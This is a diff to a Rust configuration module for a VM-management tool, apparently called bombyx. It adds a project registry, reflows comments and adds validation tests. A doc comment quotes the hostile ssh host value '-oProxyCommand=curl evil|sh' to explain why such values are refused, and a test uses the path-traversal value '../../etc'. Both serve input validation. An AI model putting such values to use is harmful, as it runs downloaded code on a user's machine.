@@ -36,6 +36,8 @@
 //! - `read` -- getting a config file off disk: whether the path
 //!   may be a symlink, how large a file may be, and how a TOML
 //!   error is summarised.
+//! - `registry` -- the operator's own `config.toml`: the VM
+//!   host, and a table per project.
 //! - `error` -- the two error types, and why there are two.
 //! - `guards` -- the rules more than one field shares.
 //! - `host` -- where the VM host name comes from, and its shape.
@@ -56,6 +58,7 @@ mod error;
 mod guards;
 mod host;
 mod read;
+mod registry;
 mod root;
 mod source;
 mod vm;
@@ -80,12 +83,12 @@ const REQUIRED_TABLES: &str = "\n[vm]\n\
 
 pub use error::{ConfigError, FieldError};
 pub use host::{
-    CONFIG_DIR_ENV, HOST_ENV, HostOrigin, HostSources, USER_CONFIG_FILE,
-    user_config_dir,
+    CONFIG_DIR_ENV, HOST_ENV, HostOrigin, HostSources, user_config_dir,
 };
 pub(crate) use host::{
     HostProblem, host_place, host_problem, is_anchored_dir, resolve_host,
 };
+pub use registry::{Project, Registry, USER_CONFIG_FILE};
 pub use source::{RepoUrl, ScriptPath, Source};
 pub use vm::{Provider, Vm};
 
@@ -211,8 +214,9 @@ impl Config {
     /// This function passes `HostSources::default()`, so a
     /// refused `host` key could not name the per-developer file.
     ///
-    /// The remaining hazard is that `source` and `host` are adjacent
-    /// `&str`, so `parse(host, path, source)` compiles. A `Host`
+    /// The remaining hazard is that `source` and `host` are both
+    /// `&str`, so swapping them type-checks:
+    /// `parse(host, path, source)` compiles. A `Host`
     /// newtype would stop that and is not worth its construction
     /// sites for a `#[cfg(test)]` constructor whose callers are all
     /// in this crate's own test suite.
@@ -316,7 +320,7 @@ impl Config {
                     HostOrigin::UserFile => {
                         sources.user_config_dir.map_or_else(
                             || origin.to_string(),
-                            |d| path_display(&d.join(USER_CONFIG_FILE)),
+                            |d| path_display(&registry::path(d)),
                         )
                     }
                     HostOrigin::Flag | HostOrigin::Env => origin.to_string(),
@@ -339,10 +343,10 @@ impl Config {
     /// The `host` rules matter most. `host` is passed as the
     /// first positional argument to `ssh`, which does not
     /// honour a `--` end-of-options separator. A value starting
-    /// with `-` is therefore read
-    /// as an *option*, so `-oProxyCommand=curl evil|sh` runs
-    /// code on this workstation from a bare `bombyx status`,
-    /// before any network traffic.
+    /// with `-` is therefore read as an *option*, so
+    /// `-oProxyCommand=curl evil|sh` runs code on this
+    /// workstation from a bare `bombyx status`, before any
+    /// network traffic.
     ///
     /// A cloned repo cannot supply that value, because `host` is
     /// refused in `bombyx.toml` (see
@@ -834,6 +838,30 @@ mod tests {
     }
 
     #[test]
+    fn a_projects_table_does_not_stop_the_host_being_read() {
+        // The registry carries project entries as well as the
+        // host, and `deny_unknown_fields` refuses every key the
+        // struct does not name. So a file with both must still
+        // give up its host.
+        let (dir, base) = project_dir(&minimal());
+        std::fs::write(
+            dir.path().join(USER_CONFIG_FILE),
+            format!(
+                "host = \"my-vmhost\"\n\n\
+                 [projects.myproject]\n\
+                 remote_root = \"~/vms\"\n\
+                 {}",
+                REQUIRED_TABLES
+                    .replace("[vm]", "[projects.myproject.vm]")
+                    .replace("[source]", "[projects.myproject.source]")
+            ),
+        )
+        .unwrap();
+        let sources = user_sources(dir.path());
+        assert_eq!(load(&base, &sources).unwrap().host, "my-vmhost");
+    }
+
+    #[test]
     fn a_user_config_without_a_host_is_not_a_host() {
         // The file exists and parses but names nothing, which
         // must read the same as no file at all.
@@ -1136,15 +1164,24 @@ mod tests {
 
     #[test]
     fn rejects_a_project_that_is_not_one_segment() {
-        let src = "project = \"../../etc\"\n";
-        let err = parse(src).unwrap_err();
-        assert!(matches!(
-            err,
-            ConfigError::Invalid {
-                field: "project",
-                ..
-            }
-        ));
+        // The length rule is here with the rest of the segment
+        // rules. The registry keys the same value with a type
+        // that enforces it, and two guards on one value must not
+        // disagree about what they allow.
+        for bad in ["../../etc", &"a".repeat(crate::name::MAX_NAME_LEN + 1)] {
+            let src = format!("project = {bad:?}\n");
+            let err = parse(&src).unwrap_err();
+            assert!(
+                matches!(
+                    err,
+                    ConfigError::Invalid {
+                        field: "project",
+                        ..
+                    }
+                ),
+                "{bad:?} was accepted"
+            );
+        }
     }
 
     #[test]
